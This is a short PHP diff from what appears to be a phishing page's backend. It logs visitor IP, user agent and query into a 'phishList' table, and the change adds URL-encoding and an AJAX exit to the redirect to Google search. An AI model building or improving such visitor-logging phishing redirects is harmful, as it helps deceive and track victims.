@@ -17,7 +17,12 @@ $sql = "INSERT INTO phishList (IP, agent, `query`)
 
 $result = mysqli_query($conn, $sql);
 
-header("Location: https://www.google.com/search?q=$query");
+if (!empty($_SERVER['HTTP_X_REQUESTED_WITH'])) {
+    exit;
+}
+
+header("Location: https://www.google.com/search?q=" . urlencode($query));
+exit;
 
 mysqli_close($conn);
 ?>
